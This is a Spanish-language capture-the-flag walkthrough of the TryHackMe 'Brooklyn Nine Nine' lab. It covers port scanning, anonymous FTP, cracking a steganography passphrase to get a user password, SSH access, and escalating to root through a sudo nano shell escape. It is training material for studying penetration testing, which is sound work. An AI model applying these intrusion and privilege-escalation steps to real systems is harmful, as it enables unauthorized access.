# Brooklyn Nine Nine - TryHackMe

## Reconocimiento 

Vamos a hacer un escaneo de puertos con nmap para ver que servicios están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.128.154.79 -oG allPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

Veamos las versiones de los servicios que están corriendo en la máquina objetivo.

```bash
nmap -sCV -p21,22,80 10.128.154.79

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.154.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos un vsftpd 3.0.3 corriendo en el puerto 21, un OpenSSH 7.6p1 corriendo en el puerto 22 y un Apache httpd 2.4.29 corriendo en el puerto 80.

En la página web http://10.128.154.79/ nos dan una pista en el código fuente, pues lo unico que se ve en la web es una imagen:

```html
<!-- Have you ever heard of steganography? -->
```

![alt text](image.png)

Utilizamos `stegseek` para buscar información en la foto de la web.

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

cat brooklyn99.jpg.out

Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Nos da la contraseña de Holt: `fluffydog12@ninenine`.

Vamos a meternos como anonymous en el FTP y ver que archivos hay.

```bash
ftp 10.128.154.79 
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

Al ver el contenido del archivo `note_to_jake.txt` nos da otra pista:

```bash
From Amy,
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Vemos que Jake tiene una contraseña débil y nos da la pista de que podemos intentar hacer un ataque de fuerza bruta a su cuenta SSH.

Vamos a hacer un escaneo de directorios con gobuster para ver si encontramos algo interesante en la web.

```bash
gobuster dir -u http://10.128.154.79 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --exclude-length 10701 --add-slash

# No vemos nada interesante en la web.
```

Nos metemos a ssh como holt:

```bash
ssh holt@10.128.154.79
holt@brookly_nine_nine:~$ id
uid=1002(holt) gid=1002(holt) groups=1002(holt)

holt@brookly_nine_nine:~$ ls
nano.save  user.txt
```

Vemos la flag de usuario en el archivo `user.txt`.

```bash
holt@brookly_nine_nine:/home/jake$ sudo -l

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

Tenemos privilegios de sudo para ejecutar el comando `nano` sin necesidad de contraseña. Podemos usar esto para escalar privilegios.

https://gtfobins.org/gtfobins/nano/#shell

```bash
nano
^R^X
reset; sh 1>&0 2>&0

# whoami
root
```

Vamos al directorio `/root` y vemos la flag de root en el archivo `root.txt`.